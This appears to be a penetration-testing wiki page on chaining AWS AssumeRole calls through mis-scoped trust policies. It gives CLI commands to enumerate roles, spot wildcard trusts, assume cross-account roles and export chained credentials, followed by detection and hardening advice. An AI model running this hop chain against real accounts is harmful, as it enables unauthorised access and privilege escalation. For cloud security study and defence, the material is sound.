---
title: AWS AssumeRole chains
slug: aws-assumerole-chains
---

> **TL;DR:** `sts:AssumeRole` is the universal AWS pivot — wildcard principals, missing `ExternalId`, and sloppy condition keys turn a single foothold into a multi-account hop chain bounded only by STS's 1-hour chained-session cap.

## What it is
Every AWS role has a trust policy (`AssumeRolePolicyDocument`) listing the principals allowed to assume it and the conditions under which they may. STS evaluates the caller's identity policy (must allow `sts:AssumeRole` on the target) and the target's trust policy (must admit the caller) — independently of org boundaries. Once assumed, the new session can itself assume further roles, so a sequence of mis-scoped trusts becomes a directed graph attackers walk to reach prod from dev. Real misconfigurations include `"Principal": {"AWS": "*"}` with no condition, missing `aws:SourceAccount`/`aws:SourceArn` on SaaS integrations, hard-coded vendor-example `ExternalId` values, and broken `StringLike` patterns on `aws:PrincipalOrgID`.

## Preconditions / where it applies
- You hold credentials for *some* principal — an IAM user, a role obtained via [[aws-imds-ssrf-pivot]], a federated identity from OIDC/SAML, or a leaked long-term key.
- The target role's trust policy admits your principal directly, via wildcard, via org-ID, or via a web-identity/SAML federation you can spoof.
- Audit-side gap: `AssumeRole` events buried in CloudTrail volume and no alerting on cross-account role hops.

## Technique
```bash
# 1. Enumerate every trust policy you can read
aws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument]' --output json > roles.json
jq -r '.[] | .[0] as $n
  | .[1].Statement[]
  | select(.Effect=="Allow")
  | "\($n)\t\(.Principal)\t\(.Condition // {})"' roles.json

# 2. Spot the bad patterns
#   - "Principal": {"AWS": "*"}                 → any AWS account
#   - "Principal": {"AWS": "arn:aws:iam::ACC:root"} no condition → whole account
#   - ExternalId == known vendor example string → vendor-account takeover
#   - StringLike on aws:PrincipalOrgID with "*" → org-wide wildcard

# 3. Hop
aws sts assume-role \
  --role-arn arn:aws:iam::222222222222:role/CrossAccountAdmin \
  --role-session-name hop1 \
  --external-id "$EXT_IF_REQUIRED"

# 4. Chain — export the hop1 creds, assume role B from there
eval "$(aws sts assume-role \
  --role-arn arn:aws:iam::333333333333:role/ProdOps \
  --role-session-name hop2 \
  --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
  --output text \
  | awk '{print "export AWS_ACCESS_KEY_ID="$1"\nexport AWS_SECRET_ACCESS_KEY="$2"\nexport AWS_SESSION_TOKEN="$3}')"
aws sts get-caller-identity
```

`PassRole` → service-runtime pivot is the other common branch: if your principal can `iam:PassRole` a high-priv role to EC2/Lambda/CodeBuild, spin up that service and call STS from inside its runtime (its identity policy is whatever the passed role allows).

## Detection and defence
- CloudTrail alerts on `AssumeRole`, `AssumeRoleWithWebIdentity`, `AssumeRoleWithSAML` to roles outside an allow-list, and on chained sessions where the source ARN is itself a session.
- Enforce `aws:SourceAccount` + `aws:SourceArn` on every SaaS trust policy; reject generic `ExternalId`s during onboarding review.
- IAM Access Analyzer external-access findings on every role; treat any "public" or "cross-account" finding as a P1.
- SCPs that deny `iam:UpdateAssumeRolePolicy` and `iam:PassRole` to broad principals; reduce `MaxSessionDuration` on admin roles.
- Use `aws:PrincipalOrgID` with exact-match `StringEquals`, never `StringLike` with wildcards.

## References
- [AWS — AssumeRole API](https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html) — parameters, `ExternalId`, session limits.
- [AWS — Role chaining](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_terms-and-concepts.html#iam-term-role-chaining) — 1-hour cap on chained sessions.
- [HackTricks Cloud — AWS IAM privesc](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-iam-privesc/index.html) — assume-role chain patterns.

See also: [[aws-sts-assume-role]], [[aws-cross-account]], [[aws-iam-enum]], [[aws-imds-ssrf-pivot]], [[gha-oidc-sub-claim-wildcards]], [[multi-cloud-pivoting]].
